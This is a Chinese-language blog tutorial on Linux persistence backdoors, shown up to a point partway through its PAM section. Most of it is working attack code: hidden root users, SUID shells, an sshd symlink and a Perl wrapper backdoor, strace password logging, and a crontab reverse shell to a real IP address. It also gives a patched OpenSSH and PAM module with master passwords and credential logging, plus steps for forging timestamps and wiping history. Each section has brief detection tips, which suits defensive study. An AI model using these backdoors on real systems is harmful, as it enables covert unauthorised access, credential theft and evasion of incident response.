<!DOCTYPE html>
<html lang="en">
  <head>
    
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="description" content="Linux下常见维权方式"/>




  <meta name="keywords" content="Linux," />





  <link rel="alternate" href="/default" title="glotozz'blog">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />



<link rel="canonical" href="https://glotozz.github.io/2020/03/12/Linux下常见维权方式/"/>


<meta property="og:type" content="article">
<meta property="og:title" content="Linux下常见维权方式">
<meta property="og:url" content="https://glotozz.github.io/2020/03/12/Linux%E4%B8%8B%E5%B8%B8%E8%A7%81%E7%BB%B4%E6%9D%83%E6%96%B9%E5%BC%8F/index.html">
<meta property="og:site_name" content="glotozz&#39;blog">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2020/03/12/gpbAXI6GKC1SdPZ.png">
<meta property="og:image" content="https://i.loli.net/2020/03/12/dac9vIkO6f3gybV.png">
<meta property="og:image" content="https://i.loli.net/2020/03/12/v89cpOyULIQ5rlK.png">
<meta property="og:image" content="https://i.loli.net/2020/03/12/LsJtSMe9V1xqTAb.png">
<meta property="og:image" content="https://i.loli.net/2020/03/12/hjSNVGr1xm62TnE.png">
<meta property="og:image" content="https://i.loli.net/2020/03/12/7gX2WIctYZam8Gz.png">
<meta property="og:image" content="https://i.loli.net/2020/03/12/6EjbDCqtNhP4Wdc.png">
<meta property="og:image" content="https://i.loli.net/2020/03/12/dA3aTLs7WFOv6u8.png">
<meta property="og:image" content="https://i.loli.net/2020/03/12/vunhbEoqfjdmxwt.png">
<meta property="og:image" content="https://i.loli.net/2020/03/12/2DuecPlxkmaArhs.png">
<meta property="og:image" content="https://i.loli.net/2020/03/12/vFgKRSnXsAIelV6.png">
<meta property="og:image" content="https://i.loli.net/2020/03/12/3MECdkUYF82sIA4.png">
<meta property="og:image" content="https://i.loli.net/2020/03/12/B6VXtZa3z5CYm1A.png">
<meta property="og:image" content="https://i.loli.net/2020/03/12/FEdHx7f4RDjJ8ve.png">
<meta property="og:image" content="https://i.loli.net/2020/03/12/8Hc1IQADjoKEtW6.png">
<meta property="og:image" content="https://i.loli.net/2020/03/12/6Q8G2VTvxSw1Fgy.png">
<meta property="og:image" content="https://i.loli.net/2020/03/12/JjX84xgStcrbnPh.png">
<meta property="og:image" content="https://i.loli.net/2020/03/12/HhBMeiDFa7sdZ8k.png">
<meta property="og:image" content="https://i.loli.net/2020/03/12/Myk4pwdoZcBPN6X.png">
<meta property="og:image" content="https://i.loli.net/2020/03/12/oBaFQP8em2j5OyE.png">
<meta property="article:published_time" content="2020-03-12T01:29:56.000Z">
<meta property="article:modified_time" content="2020-03-12T11:46:15.336Z">
<meta property="article:author" content="glotozz">
<meta property="article:tag" content="Linux">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2020/03/12/gpbAXI6GKC1SdPZ.png">


<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>





<script type="text/javascript">
  var themeConfig = {
    fancybox: {
      enable: false
    },
  };
</script>




  



    <title> Linux下常见维权方式 - glotozz'blog </title>
  <meta name="generator" content="Hexo 4.2.0"></head>

  <body>
    <div id="page">
      <header id="masthead"><div class="site-header-inner">
    <h1 class="site-title">
        <a href="/." class="logo">glotozz'blog</a>
    </h1>

    <nav id="nav-top">
        
            <ul id="menu-top" class="nav-top-items">
                
                    <li class="menu-item">
                        <a href="/archives">
                            
                            
                                Archives
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/about">
                            
                            
                                About
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/read">
                            
                            
                                Read
                            
                        </a>
                    </li>
                
            </ul>
        
  </nav>
</div>

      </header>
      <div id="content">
        
    <div id="primary">
        
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          Linux下常见维权方式
        
      </h1>

      <time class="post-time">
          Mar 12 2020
      </time>
    </header>



    
            <div class="post-content">
            <meta name="referrer" content="no-referrer">
<a id="more"></a>

<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
<!-- toc -->

<ul>
<li><a href="#1-一句话添加用户和密码">1、一句话添加用户和密码</a></li>
<li><a href="#2-suid-shell">2、SUID Shell</a></li>
<li><a href="#3-ssh公私钥免密登录">3、ssh公私钥免密登录</a></li>
<li><a href="#4-软连接">4、软连接</a></li>
<li><a href="#5-ssh-wrapper">5、SSH wrapper</a></li>
<li><a href="#6-strace后门">6、strace后门</a></li>
<li><a href="#7-crontab反弹shell">7、crontab反弹shell</a></li>
<li><a href="#8-openssh后门">8、openssh后门</a></li>
<li><a href="#9-pam后门">9、PAM后门</a></li>
<li><a href="#10-rookit后门">10、rookit后门</a></li>
<li><a href="#参考链接">参考链接：</a></li>
</ul>
<!-- tocstop -->

<hr>
<p>看了篇文章觉得还不错。本着实践出真知的原理，自己动手操作下</p>
<hr>
<h4><span id="1-一句话添加用户和密码">1、一句话添加用户和密码</span></h4><p><strong>添加普通用户</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 创建一个用户名guest，密码123456的普通用户</span><br><span class="line">useradd -p &#96;openssl passwd -1 -salt &#39;salt&#39; 123456&#96; guest</span><br><span class="line"></span><br><span class="line"># useradd -p 方法  &#96; &#96; 是用来存放可执行的系统命令,&quot;$()&quot;也可以存放命令执行语句</span><br><span class="line">useradd -p &quot;$(openssl passwd -1 123456)&quot; guest</span><br><span class="line"></span><br><span class="line"># chpasswd方法</span><br><span class="line">useradd guest;echo &#39;guest:123456&#39;|chpasswd</span><br><span class="line"></span><br><span class="line"># echo -e方法，-e：激活转义字符。</span><br><span class="line"># 使用-e选项时，若字符串中出现以下字符，则特别加以处理，而不会将它当成一般文字输出</span><br><span class="line">useradd test;echo -e &quot;123456\n123456\n&quot; |passwd test</span><br></pre></td></tr></table></figure>

<p><strong>添加root用户</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 创建一个用户名guest，密码123456的root用户</span><br><span class="line">useradd -p &#96;openssl passwd -1 -salt &#39;salt&#39; 123456&#96; guest -o -u 0 -g root -G root -s &#x2F;bin&#x2F;bash -d &#x2F;home&#x2F;test</span><br></pre></td></tr></table></figure>

<blockquote>
<p>有些服务器可能有密码策略，需要将密码设置的复杂些</p>
</blockquote>
<p>这时候看一下<code>/etc/passwd</code></p>
<p><img src="https://i.loli.net/2020/03/12/gpbAXI6GKC1SdPZ.png" alt="Snipaste_2020-03-12_09-40-35.png"></p>
<p>明显guest2是root权限</p>
<p>*<em>可疑用户排查 *</em></p>
<blockquote>
<p>awk命令语法：</p>
<p> awk工作流程是这样的：读入有’\n’换行符分割的一条记录，然后将记录按指定的域分隔符划分域，填充域，$0则表示所有域,$1表示第一个域,$n表示第n个域。默认域分隔符是”空白键” 或 “[tab]键” </p>
<p><code>-F</code>指定分隔符</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 查询特权用户特权用户(uid 为0)</span><br><span class="line">awk -F: &#39;$3&#x3D;&#x3D;0&#123;print $1&#125;&#39; &#x2F;etc&#x2F;passwd</span><br><span class="line"># 查询可以远程登录的帐号信息</span><br><span class="line">awk &#39;&#x2F;\$1|\$6&#x2F;&#123;print $1&#125;&#39; &#x2F;etc&#x2F;shadow</span><br><span class="line"># 除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class="line">more &#x2F;etc&#x2F;sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL&#x3D;(ALL)&quot;</span><br></pre></td></tr></table></figure>

<p>可疑用户删除    <code>userdel guest1</code></p>
<hr>
<h4><span id="2-suid-shell">2、SUID Shell</span></h4><p> Suid shell是一种可用于以拥有者权限运行的shell。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 配合普通用户权限使用</span><br><span class="line">cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;shell</span><br><span class="line">chmod u+s &#x2F;tmp&#x2F;shell</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/03/12/dac9vIkO6f3gybV.png" alt="Snipaste_2020-03-12_11-20-42.png"></p>
<blockquote>
<p>备注：bash2针对suid做了一些防护措施，需要使用-p参数来获取一个root shell。另外，普通用户执行这个SUID shell时，一定要使用全路径。 </p>
</blockquote>
<p><strong>排查技巧</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 在Linux中查找SUID设置的文件</span><br><span class="line">find . -perm &#x2F;4000</span><br><span class="line"># 在Linux中查找使用SGID设置的文件</span><br><span class="line">find . -perm &#x2F;2000</span><br><span class="line"># 取消s权限</span><br><span class="line">chmod u-s &#x2F;tmp&#x2F;shell</span><br></pre></td></tr></table></figure>

<hr>
<h4><span id="3-ssh公私钥免密登录">3、ssh公私钥免密登录</span></h4><p><strong>写入公钥</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#将自己主机的home&#x2F;xxx&#x2F;.ssh&#x2F;id_rsa.pub写入靶机&#x2F;home&#x2F;ford&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">ssh ford@192.168.56.102</span><br><span class="line"></span><br><span class="line">ssh-keygen</span><br><span class="line">ls -la &#x2F;home&#x2F;pinak&#x2F;.ssh</span><br><span class="line">cat &#x2F;home&#x2F;pinak&#x2F;.ssh&#x2F;id_rsa.pub &gt; &#x2F;home&#x2F;pinak&#x2F;authorized_keys</span><br><span class="line">sudo -u sarang cp &#x2F;home&#x2F;pinak&#x2F;authorized_keys &#x2F;home&#x2F;sarang&#x2F;.ssh&#x2F;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/03/12/v89cpOyULIQ5rlK.png" alt="Snipaste_2020-03-12_11-43-08.png"></p>
<p><strong>排查技巧</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看&#x2F;root&#x2F;.ssh&#x2F;authorized_keys是否被修改。</span><br></pre></td></tr></table></figure>

<p><strong>使用私钥</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#根据&#x2F;etc&#x2F;passwd确定用户ford后，读取私钥&#x2F;home&#x2F;ford&#x2F;.ssh&#x2F;id_rsa，复制下来，注意将id_rsa设置为700</span><br><span class="line">ssh ford@192.168.56.102 -p 6688 -i id_rsa</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/03/12/LsJtSMe9V1xqTAb.png" alt="Snipaste_2020-03-12_13-48-39.png"></p>
<p>仅靠一个私钥并不能直接登录，但是当时做Cynix靶机的确只读取了私钥即可成功登录。查看了下发现配置<code>PasswordAuthentication no</code>即禁用密码登录，最后发现<code>.ssh</code>目录下<code>authorized_keys</code>填写了靶机自身的公钥。原理和上面的写入公钥相同，只是多了一种思路。但是我之后测试发现还是失败，应该还需要修改什么配置。</p>
<hr>
<h4><span id="4-软连接">4、软连接</span></h4><blockquote>
<p>在sshd服务配置运行PAM认证的前提下，PAM配置文件中控制标志为sufficient时只要pam_rootok模块检测uid为0即root权限即可成功认证登陆。通过软连接的方式，实质上PAM认证是通过软连接的文件名 <code>/tmp/su</code> 在<code>/etc/pam.d/</code>目录下寻找对应的PAM配置文件(如: /etc/pam.d/su)，任意密码登陆的核心是<code>auth sufficient pam_rootok.so</code>，所以只要PAM配置文件中包含此配置即可SSH任意密码登陆，除了su中之外还有chsh、chfn同样可以。 </p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#创建软连接，并开启6688端口</span><br><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su;&#x2F;tmp&#x2F;su -oPort&#x3D;6688</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/03/12/hjSNVGr1xm62TnE.png" alt="Snipaste_2020-03-12_14-41-48.png"></p>
<p><strong>排查技巧</strong></p>
<p>进程、端口都可以发现异常， <code>kill -s 9 PID</code> 结束进程即可清除后门。 </p>
<p><img src="https://i.loli.net/2020/03/12/7gX2WIctYZam8Gz.png" alt="Snipaste_2020-03-12_14-46-39.png"></p>
<hr>
<h4><span id="5-ssh-wrapper">5、SSH wrapper</span></h4><blockquote>
<p>init首先启动的是/usr/sbin/sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动/usr/bin/sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的/usr/sbin/sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell。 </p>
</blockquote>
<p>服务端</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;sbin&#x2F;</span><br><span class="line">mv sshd ..&#x2F;bin&#x2F;</span><br><span class="line">echo &#39;#!&#x2F;usr&#x2F;bin&#x2F;perl&#39; &gt;sshd</span><br><span class="line">echo &#39;exec &quot;&#x2F;bin&#x2F;sh&quot; if(getpeername(STDIN) &#x3D;~ &#x2F;^..4A&#x2F;);&#39; &gt;&gt;sshd</span><br><span class="line">echo &#39;exec&#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125; &quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV,&#39; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">#ubuntu</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;sshd restart</span><br></pre></td></tr></table></figure>

<p>客户端</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat STDIO TCP4:118.178.88.46:22,sourceport&#x3D;13377</span><br></pre></td></tr></table></figure>

<p>没成功。应该是服务端系统的原因，上面的需要在ubuntu下，我的服务端是centos</p>
<p><img src="https://i.loli.net/2020/03/12/6EjbDCqtNhP4Wdc.png" alt="Snipaste_2020-03-12_15-18-33.png"></p>
<p><strong>排查技巧</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -al &#x2F;usr&#x2F;sbin&#x2F;sshd</span><br><span class="line">cat &#x2F;usr&#x2F;sbin&#x2F;sshd</span><br><span class="line"># 可通过重装ssh服务恢复。</span><br></pre></td></tr></table></figure>

<hr>
<h4><span id="6-strace后门">6、strace后门</span></h4><p>找到进程PID</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep sshd #父进程PID</span><br><span class="line">strace -f -p 2908 -o &#x2F;tmp&#x2F;.ssh.log -e trace&#x3D;read,write -s 2048</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/03/12/dA3aTLs7WFOv6u8.png" alt="Snipaste_2020-03-12_15-42-35.png"></p>
<p>通过配置用户目录下.login配置获取ssh明文密码 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#vim &#x2F;etc&#x2F;bashrc</span><br><span class="line">alias ssh&#x3D;&#39;strace -o &#x2F;tmp&#x2F;.ssh.log -e read,write,connect -s 2048 ssh&#39;</span><br><span class="line">#source &#x2F;root&#x2F;.bashrc</span><br><span class="line">#su，sudo同样的道理</span><br></pre></td></tr></table></figure>

<p>那么只要目标使用ssh，便会在<code>/tmp</code>目录下生成记录</p>
<p><img src="https://i.loli.net/2020/03/12/vunhbEoqfjdmxwt.png" alt="Snipaste_2020-03-12_15-34-59.png"></p>
<p> <strong>排查技巧</strong></p>
<p>使用<code>alias</code>即可发现异常。 </p>
<hr>
<h4><span id="7-crontab反弹shell">7、crontab反弹shell</span></h4><p><code>crontab</code>命令用于设置周期性被执行的指令。新建shell脚本，利用脚本进行反弹。 </p>
<p><code>/etc/evil.sh</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;118.178.88.46&#x2F;1234  0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +sx &#x2F;etc&#x2F;evil.sh</span><br></pre></td></tr></table></figure>

<p><code>/etc/crontab</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#每一分钟执行一次</span><br><span class="line">*&#x2F;1 * * * * root &#x2F;etc&#x2F;evil.sh</span><br></pre></td></tr></table></figure>

<p>重启</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#ubuntu</span><br><span class="line">service cron start</span><br><span class="line">#centos</span><br><span class="line">service crond restart</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/03/12/2DuecPlxkmaArhs.png" alt="Snipaste_2020-03-12_15-56-12.png"></p>
<p><strong>排查技巧</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 查看可疑的定时任务列表</span><br><span class="line">cat &#x2F;etc&#x2F;crontab</span><br><span class="line">crontab -e</span><br></pre></td></tr></table></figure>

<hr>
<h4><span id="8-openssh后门">8、openssh后门</span></h4><p> 利用openssh后门，设置SSH后门密码及root密码记录位置，隐蔽性较强，不易被发现。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#查看sshd系统版本，之后需要修改</span><br><span class="line">ssh -V</span><br><span class="line">OpenSSH_6.6.1p1, OpenSSL 1.0.1e-fips 11 Feb 2013</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">a、备份SSH配置文件</span><br><span class="line">mv &#x2F;etc&#x2F;ssh&#x2F;ssh_config &#x2F;etc&#x2F;ssh&#x2F;ssh_config.old</span><br><span class="line">mv &#x2F;etc&#x2F;ssh&#x2F;sshd_config &#x2F;etc&#x2F;ssh&#x2F;sshd_config.old</span><br><span class="line"></span><br><span class="line">b、解压并安装补丁</span><br><span class="line">tar -zxvf openssh-5.9p1.tar.gz</span><br><span class="line">tar -zxvf 0x06-openssh-5.9p1.patch.tar.gz</span><br><span class="line">cp openssh-5.9p1.patch&#x2F;sshbd5.9p1.diff openssh-5.9p1&#x2F;</span><br><span class="line">cd openssh-5.9p1</span><br><span class="line">patch &lt; sshbd5.9p1.diff</span><br><span class="line"></span><br><span class="line">c、记录用户名和密码的文件位置及其密码</span><br><span class="line">vi  includes.h</span><br><span class="line">    #define ILOG &quot;&#x2F;tmp&#x2F;1.txt&quot;             &#x2F;&#x2F;记录登录本机的用户名和密码</span><br><span class="line">    #define OLOG &quot;&#x2F;tmp&#x2F;2.txt&quot;             &#x2F;&#x2F;记录本机登录远程的用户名和密码</span><br><span class="line">    #define SECRETPW &quot;123456789&quot;          &#x2F;&#x2F;后门的密码</span><br><span class="line"></span><br><span class="line">d、修改版本信息</span><br><span class="line">vi version.h</span><br><span class="line">    #define SSH_VERSION &quot;填入之前记下来的版本号,伪装原版本&quot;</span><br><span class="line">    #define SSH_PORTABLE &quot;小版本号&quot;</span><br><span class="line"></span><br><span class="line">e、安装并编译</span><br><span class="line">.&#x2F;configure --prefix&#x3D;&#x2F;usr --sysconfdir&#x3D;&#x2F;etc&#x2F;ssh --with-pam --with-kerberos5</span><br><span class="line">make clean</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">service sshd restart</span><br><span class="line"></span><br><span class="line">f、对比原来的配置文件，使配置文件一致，然后修改文件日期。</span><br><span class="line"></span><br><span class="line">touch -r  &#x2F;etc&#x2F;ssh&#x2F;ssh_config.old &#x2F;etc&#x2F;ssh&#x2F;ssh_config</span><br><span class="line">touch -r  &#x2F;etc&#x2F;ssh&#x2F;sshd_config.old &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line"></span><br><span class="line">g、清除操作记录</span><br><span class="line">export HISTFILE&#x3D;&#x2F;dev&#x2F;null</span><br><span class="line">export HISTSIZE&#x3D;0</span><br><span class="line">echo &gt;&#x2F;root&#x2F;.bash_history &#x2F;&#x2F;清空操作日志</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/03/12/vFgKRSnXsAIelV6.png" alt="Snipaste_2020-03-12_16-27-28.png"></p>
<p>修改日志输出和密码</p>
<p><img src="https://i.loli.net/2020/03/12/3MECdkUYF82sIA4.png" alt="Snipaste_2020-03-12_16-49-25.png"></p>
<p>修改version</p>
<p><img src="https://i.loli.net/2020/03/12/B6VXtZa3z5CYm1A.png" alt="Snipaste_2020-03-12_16-33-31.png"></p>
<p>成功，<code>ilog</code>中记录了本机登录的账号密码，<code>olog</code>中记录了本机登录其他机器的明文密码</p>
<p><img src="https://i.loli.net/2020/03/12/FEdHx7f4RDjJ8ve.png" alt="Snipaste_2020-03-12_16-47-09.png"></p>
<p><strong>排查技巧</strong></p>
<p>利用strace找出ssh后门</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 1、获取可疑进程PI</span><br><span class="line">ps aux | grep sshd</span><br><span class="line"># 2、跟踪sshd PID</span><br><span class="line">strace -o aa -ff -p  PID</span><br><span class="line"># 3、查看记录密码打开文件</span><br><span class="line">grep open sshd* | grep -v -e No -e  null -e denied| grep  WR</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/03/12/8Hc1IQADjoKEtW6.png" alt="Snipaste_2020-03-12_16-51-43.png"></p>
<hr>
<h4><span id="9-pam后门">9、PAM后门</span></h4><p>PAM （Pluggable Authentication Modules ）是由Sun提出的一种认证机制。它通过提供一些动态链接库和一套统一的API，将系统提供的服务和该服务的认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式而无需更改服务程序，同时也便于向系统中添加新的认证手段。PAM最初是集成在Solaris中，目前已移植到其它系统中，如Linux、SunOS、HP-UX 9.0等。</p>
<p>利用方法:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、获取目标系统所使用的PAM版本，下载对应版本的pam版本</span><br><span class="line">2、解压缩，修改pam_unix_auth.c文件，添加万能密码</span><br><span class="line">3、编译安装PAM</span><br><span class="line">4、编译完后的文件在：modules&#x2F;pam_unix&#x2F;.libs&#x2F;pam_unix.so，复制到&#x2F;lib64&#x2F;security中进行替换，即可使用万能密码登陆，并将用户名密码记录到文件中。</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -qa | grep pam</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/03/12/6Q8G2VTvxSw1Fgy.png" alt="Snipaste_2020-03-12_16-55-26.png"></p>
<blockquote>
<p><a href="http://www.linux-pam.org/library/" target="_blank" rel="noopener">http://www.linux-pam.org/library/</a> </p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf Linux-PAM-1.1.8.tar.gz</span><br><span class="line">cd Linux-PAM-1.1.8</span><br><span class="line">cd modules&#x2F;pam_unix&#x2F;</span><br><span class="line">vi pam_unix_auth.c</span><br></pre></td></tr></table></figure>

<p>106行添加<code>FILE *fp;</code></p>
<p><img src="https://i.loli.net/2020/03/12/JjX84xgStcrbnPh.png" alt="Snipaste_2020-03-12_17-13-43.png">在177行添加</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*password:&quot;redkey&quot;*&#x2F;</span><br><span class="line">if(strcmp(p,&quot;redkey&quot;)&#x3D;&#x3D;0)</span><br><span class="line">&#123;</span><br><span class="line">        retval &#x3D; PAM_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">if(retval&#x3D;&#x3D; PAM_SUCCESS)</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;*pamfile:pamwd.txt*&#x2F;</span><br><span class="line">        fp&#x3D;fopen(&quot;pamwd.txt&quot;,&quot;a&quot;);</span><br><span class="line">        fprintf(fp,&quot;%s::%s\n&quot;,name,p);</span><br><span class="line">        fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line">        name &#x3D; p &#x3D; NULL;</span><br><span class="line"></span><br><span class="line">        AUTH_RETURN;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/03/12/HhBMeiDFa7sdZ8k.png" alt="Snipaste_2020-03-12_17-03-59.png"></p>
<p>编译</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ..&#x2F;..&#x2F;</span><br><span class="line">.&#x2F;configure</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<p>备份原有PAM模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -name pam_unix.so</span><br><span class="line">&#x2F;usr&#x2F;lib64&#x2F;security&#x2F;pam_unix.so</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;lib64&#x2F;security&#x2F;pam_unix.so</span><br><span class="line">mv pam_unix.so&#123;,.bak&#125;</span><br></pre></td></tr></table></figure>

<p> 复制新PAM模块到/lib64/security/目录下：</p>
